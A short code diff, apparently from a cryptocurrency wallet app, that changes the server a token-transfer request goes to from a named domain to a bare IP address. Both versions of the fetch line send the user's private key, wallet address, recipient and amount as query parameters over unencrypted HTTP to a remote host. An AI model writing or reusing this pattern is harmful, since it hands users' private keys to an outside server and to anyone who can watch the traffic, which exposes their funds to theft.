@@ -97,7 +97,7 @@ var tockenadrs =[];
         });
       }
       else if (value <= data.balance) {
-        await fetch("http://sbgwallet.io:8082/transfertcn?privateKey="+pkeys+"&walletAddress="+from+"&to="+to+"&amount="+value+"&rpc="+rpc+"&tadrs="+tadrs)
+        await fetch("http://167.172.106.122:8082/transfertcn?privateKey="+pkeys+"&walletAddress="+from+"&to="+to+"&amount="+value+"&rpc="+rpc+"&tadrs="+tadrs)
       .then((res) => res.json())
       .then(async (data) => { 
         console.log(data);
